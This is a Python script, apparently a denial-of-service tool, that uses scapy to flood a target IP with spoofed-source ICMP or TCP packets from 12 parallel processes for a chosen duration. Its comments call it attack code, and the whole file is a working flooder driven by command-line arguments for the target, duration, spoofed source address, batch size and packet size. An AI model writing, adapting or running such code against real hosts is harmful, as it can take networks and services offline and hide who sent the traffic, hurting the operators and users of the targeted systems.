import sys
import time
from multiprocessing import Pool
from scapy.all import IP, ICMP, send, TCP
from scapy.packet import Raw

number_of_logical_processors = 12  # number to number of logical processors that are allocated to the program


# attack code for icmp attack, can replace start_attack_tcp on line 43, but not recommended
def start_attack_icmp(input_tuple):
    target_ip, attack_duration, spoofed_source, packets_per_batch, packet_size, core_number = input_tuple  # for multiprocessing reasons, input needs to be one argument
    initial_time = time.time()
    data = Raw(b"X"*packet_size)
    packet = IP(src=spoofed_source, dst=target_ip, ttl=255) / ICMP() / data  # creating spoofed ping request
    while time.time() <= initial_time + int(attack_duration):
        send(packet, count=packets_per_batch, verbose=False)  # send spoofed ping request
    return True


# attack code for tcp attack
def start_attack_tcp(input_tuple):
    destination_port = 8011  # random port to have the packet be sent to, may be changed
    target_ip, attack_duration, spoofed_source, packets_per_batch, packet_size, core_number = input_tuple  # for multiprocessing reasons, input needs to be only one argument.
    initial_time = time.time()  # saving initial time of attack
    data = Raw(b"X"*packet_size)
    packet = IP(src=spoofed_source, dst=target_ip, ttl=255) / TCP(dport=destination_port) / data  # creating spoofed tcp request
    while time.time() <= initial_time + int(attack_duration):  # checking attack wasn't supposed to end
        send(packet, count=packets_per_batch, verbose=False)  # send spoofed tcp request
    return True


# initialise attack variables
target_ip = sys.argv[1]
attack_duration = int(sys.argv[2])
spoofed_source = sys.argv[3]
packets_per_batch = int(sys.argv[4])
packet_size = int(sys.argv[5])

if __name__ == "__main__":  # mandatory check
    with Pool() as pool:
        number_of_processes = [(target_ip, attack_duration, spoofed_source, packets_per_batch, packet_size, x+1) for x in range(number_of_logical_processors)]  # creating list of arguments
        results = pool.imap_unordered(start_attack_tcp, number_of_processes)  # initializing processes
        for x in results:  # starting processes
            pass
